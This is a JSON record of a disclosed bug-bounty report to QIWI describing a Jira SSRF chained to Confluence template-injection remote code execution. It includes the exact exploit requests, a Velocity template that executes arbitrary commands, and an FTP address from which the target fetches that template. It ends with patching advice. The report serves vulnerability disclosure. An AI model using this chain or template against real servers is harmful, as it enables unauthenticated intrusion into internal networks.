@@ -1,0 +1,136 @@
+{
+  "id": 713900,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MTM5MDA=",
+  "url": "https://hackerone.com/reports/713900",
+  "title": "Unauthenticated SSRF in jira.tochka.com leading to RCE in confluence.bank24.int",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-10-14T12:47:27.753Z",
+  "submitted_at": "2019-10-14T12:47:27.753Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "alexeypetrenko",
+    "url": "/alexeypetrenko",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/xHUjQgeBaKSa1AHWRYLiiSgg/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 215,
+    "url": "https://hackerone.com/qiwi",
+    "handle": "qiwi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "QIWI",
+      "twitter_handle": "QiwiRussia",
+      "website": "https://qiwi.com",
+      "about": "The QIWI brand is a family brand that consolidates several directions: kiosks, wallet, bank."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-8451",
+    "CVE-2019-3396"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-06-29T08:43:36.726Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-06-29T08:43:36.643Z",
+  "team_member_agreed_on_going_public_at": "2021-06-29T08:38:15.693Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary\n\nThis report describes a combination of two separate vulnerabilities in two separate services. This chain of vulnerabilities allows unauthenticated attacker to run arbitrary code on a server inside the company's internal network.\n\n## Vulnerability 1\nJira at [https://jira.tochka.com](https://jira.tochka.com) is vulnerable to [SSRF in the /plugins/servlet/gadgets/makeRequest resource - CVE-2019-8451](https://jira.atlassian.com/browse/JRASERVER-69793).\nAnyone on the internet can make it issue arbitrary HTTPS requests and read responses.\n\nMoreover:\n - Any number of arbitrary HTTP headers can be specified in request.\n - Requests are not limited by type.\n   - POST and GET requests are supported.\n\nThis allows an attacker to reach internal instance of Confluence [https://confluence.bank24.int](https://confluence.bank24.int).\n\n## Vulnerability 2\nConfluence at [https://confluence.bank24.int](https://confluence.bank24.int), uses a vulnerable version of a `Widget Connector` plugin. This vulnerability leads to an RCE (`CVE-2019-3396`).\n\nThere is an [advisory](https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html) by Atlassian. Also, there is a publicly known exploit to this vulnerability.\n\n# Technical details\n\n## SSRF\n### Root cause\n - Jira uses whitelist to determine allowed URLs.\n - Jira itself is always whitelisted ([https://jira.tochka.com](https://jira.tochka.com))\n - Filter could be tricked by using URL in form of `https://jira.tochka.com:443@example.com/`\n\n\nThis bug could be used to send requests to an internal Confluence server [https://confluence.bank24.int](https://confluence.bank24.int) like so:\n\n**Request example:**\n```\nPOST /plugins/servlet/gadgets/makeRequest HTTP/1.1\nHost: jira.tochka.com\nUser-Agent: curl/7.61.1\nAccept: */*\nX-Atlassian-Token: no-check\nContent-Length: 53\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nurl=https://jira.tochka.com:443@confluence.bank24.int\n```\n**Response snippet:**\n```\nthrow 1; < don't be evil' >{\"https://jira.tochka.com:443@confluence.bank24.int\":{\"rc\":200,\"headers\":{},\"body\":\"<!DOCTYPE html>\\n<html>\\n<head>\\n                    <title>Рабочий стол - Confluence<\\/title>\\n    \\n        \\n\\n                        \\n    \\n                        \\n    \\n\\n    \\n    <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=EDGE,chrome=IE7\\\">\\n<meta charset=\\\"UTF-8\\\">\\n<meta id=\\\"confluence-context-path\\\" name=\\\"confluence-context-path\\\" content=\\\"\\\">\\n<meta id=\\\"confluence-base-url\\\" name=\\\"confluence-base-url\\\" content=\\\"https://confluence.bank24.int\\\">\\n\\n<meta id=\\\"atlassian-token\\\" name=\\\"atlassian-token\\\" content=\\\"f999fa99a5663c168e72b407eecdeec3695c70d0\\\">\\n\\n\\n<script type=\\\"text/javascript\\\">\\n        var contextPath = '';\\n<\\/script>\\n\\n    \\n\\n    <meta name=\\\"confluence-request-time\\\" content=\\\"1571051898165\\\">\\n        \\n    \\n        \\n            <meta name=\\\"ajs-discovered-plugin-features\\\" content=\\\"$discoveredList\\\">\\n            <meta name=\\\"ajs-use-keyboard-shortcuts\\\" content=\\\"true\\\">\\n            <meta name=\\\"ajs-keyboardshortcut-hash\\\" content=\\\"97637bc20dfc7a1f15684630bc99897\\\">\\n            <meta id=\\\"team-calendars-has-jira-link\\\" content=\\\"true\\\">\\n            <meta name=\\\"ajs-team-calendars-display-time-format\\\" content=\\\"displayTimeFormat24\\\">\\n            <meta id=\\\"team-calendars-display-week-number\\\" content=\\\"false\\\">\\n            <meta\n...\n```\n\n## Widget connector RCE\n### Vulnerability details\n - Confluence plugin preview functionality ([https://confluence.bank24.int/rest/tinymce/1/macro/preview](https://confluence.bank24.int/rest/tinymce/1/macro/preview)) is available without any authentification by design. \n - Vulnerable plugin allows to specify a path to a server side template which is rendered.\n - This path could be a URL\n - Following schemes are supported:\n   - http\n   - https\n   - file\n   - ftp\n\n### Attack scenario\n - Attacker hosts malicious template somewhere on the internet\n - Attacker triggers plugin preview functionality with template parameter pointing to this template\n - Malicious template is fetched and evaluated on a confluence server.\n\nIt looks that you have restrictions in place for outgoing HTTP and HTTPS requests, but not for FTP.\n\n# PoC\nI set up an FTP server to serve a malicious template at [ftp://68.183.67.159/qwe2.txt](ftp://68.183.67.159/qwe2.txt)\n\nFile contents is:\n\n```\n#set ($exp=\"exp\")\n#set ($a=$exp.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec($command))\n#set ($input=$exp.getClass().forName(\"java.lang.Process\").getMethod(\"getInputStream\").invoke($a))\n#set($sc = $exp.getClass().forName(\"java.util.Scanner\"))\n#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName(\"java.io.InputStream\")))\n#set($scan=$constructor.newInstance($input).useDelimiter(\"\\\\A\"))\n#if($scan.hasNext())\n    $scan.next()\n#end\n3232\n```\nIt takes `command` parameter, executes corresponding command and returns the result back.\n\nTo trigger this chain of vulnerabilities execute following request:\n\n```\nPOST /plugins/servlet/gadgets/makeRequest HTTP/1.1\nHost: jira.tochka.com\nUser-Agent: curl/7.61.1\nAccept: */*\nX-Atlassian-Token: no-check\nContent-Length: 322\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nurl=https://jira.tochka.com:443@confluence.bank24.int/rest/tinymce/1/macro/preview&httpMethod=POST&headers=content-type%3Dapplication/json&postData={\"contentId\":\"1\",\"macro\":{\"body\":\"\",\"params\":{\"url\":\"https://www.youtube.com/watch?v=y6sOtXOvchY\",\"_template\":\"ftp://68.183.67.159/qwe2.txt\",\"command\":\"id\"},\"name\":\"widget\"}}\n```\n\nIt makes Jira to send a macro preview request to the Confluence. Confluence then fetches a template from FTP server and executes `id` command\n\n*Response snippet:*\n```\n...\n<div class=\\\"wiki-content\\\">\\n                   uid=502(confluence) gid=502(confluence) groups=502(confluence) context=unconfined_u:system_r:initrc_t:s0\\n\\r\\n3232\\r\\n\\n            <\\/div>\\n\n...\n```\n\nYou may change `command` parameter to your liking.\n\n\n# Mitigation recommendation\n\n - Upgrade Jira to version 7.13.9 or 8.4.0.\n - Update Confluence installation to use `Widget Connector` plugin version 3.1.4 or higher.\n\n## Impact\n\nThis chain of vulnerabilities allows unauthenticated attacker to run arbitrary code on a server inside the company's internal network.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 607223,
+      "file_name": "SSRF.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/29EiAE9EfJsCe4NzYaNFFajh?response-content-disposition=attachment%3B%20filename%3D%22SSRF.png%22%3B%20filename%2A%3DUTF-8%27%27SSRF.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132933Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d38463383aa1c44beed4877f64b85e821ed2a78b7c3d2539f4e6a5fe7ee122eb",
+      "file_size": 218159,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 607224,
+      "file_name": "RCE.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eFdpx6gy2SygB3fNbRPUziJc?response-content-disposition=attachment%3B%20filename%3D%22RCE.png%22%3B%20filename%2A%3DUTF-8%27%27RCE.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUOKVM5L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132933Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2Bt0omVOHrZ9OL9Trk%2BdFKhBv%2FQrKC65W11rjrMgC%2F6QIhANia%2FTyBcfeu0XFctw1a%2FJDDLBAa34%2BWU%2F53rhxkz%2BKhKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5IgxUKMbWt1VTh5nJA5MqjgWpIiqILEweaNhgRF6m1s3guYn11lerqJNrnFjeROxUEJywbXRrt%2FcAshROQMcI4IP1FF5kzaP6N8mOGtMrRL%2FiPu4S3YpijdtIekdCS1Sn6Snt4Sh4hrILW%2Bb8ze6H%2F8%2BUjG3tsefJ2i7e6RAZ95Jy%2FsR7Gyo717mGo8tT2xBovHwjfmR5eCTxEwySxWEQvCnkU8sWiVU4TVsVyZojCQaslBXYJlwFTmuq95Ka7nfTvMgKz2HKR%2BHa7dIsA2obOMA1gq914%2BAgrDq45xv0U8MzkvK2tpK9dfMSBVfPWAFHxIt5sREveo4mZ2nlBAm%2BX77TaBAPdROjeHNp2e8Y8GU73sHmCxPEQ6RVEBNo1Cpqin5nayoOUqgSikVBZNppJWCf78ZqDFx6xAksvybCUspLPt8UiXeCwawB4vSOwq1RhpGympS%2F4X%2BAfeB4Och%2Bx%2BOR8nKDDKe3Y%2BeIUIzmLq7R63lPB%2BEoYre1R8%2Bf%2F%2BYGK3IVaxII1oWPg4zPRX6SOnrZtXGjWyAfZ%2F6lNEUsc6rYsPzapeuVSlq%2FRTHQ%2BbWGOkn3wxqxzOCLbZSltQ7LZsPVDrrri2fFwWrFwoheZZCDY0vSRv08hDQ%2Fkq3xDInCDWZMeu%2FK40kiRmv6ehFATji5N1OJbLemuPO%2BTwvrdcBn9fQS4BkDMFIrGhE%2FuOwv61gkyL1fOapjm3KOWa8BmzAuFidAmAy%2BVnosQJMh3ckcvSXiD8sLINTU%2FbSsdV7beCmMpyf6fP3p%2F7VcwiGBABGo294shnTdhd2P0IxsSt7anyRTek2yB5NqzUYBr8WXNft2l3V3HTxgS9tRQXGp0RJdLlzDT1qxWJvF2JoUm4vQH5Pwhirc51bptu0N99Iwn6%2BtrgY6sAElrGju%2FXz82pDWWGfZvz6UL%2Fm95ZWtM25B7Ca5iNmiTQUqK%2BPhqtvh3TLN14mj%2BOXWFTSoPWS4IHLzNFsgx2J0aY83%2FElbkWzC43VwT7caBSFcI5aYu4krRCov2TutbftS11vV1dOme5hlM9%2Bf%2FlUY4xpo4dgVYdlW83DxHU%2BAO74ifhWVTZa4oAIO7OK8ImejZkl87d9LyTXqXHcY75D4o2LMg4shUYHjgRj5VB%2BvcA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9b18ea2826b21e87fd36023e91a73051ee80a34b28247b865aa14b286de3e9ed",
+      "file_size": 269542,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-07-29T08:38:15.875Z",
+  "allow_singular_disclosure_after": -80283077.85978448,
+  "singular_disclosure_allowed": true,
+  "vote_count": 218,
+  "voters": [
+    "chux",
+    "neeythann",
+    "pilvar",
+    "screamy",
+    "time4ster",
+    "bncrypted",
+    "jumpydata",
+    "xenx",
+    "lubak",
+    "rootz491",
+    "and 208 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
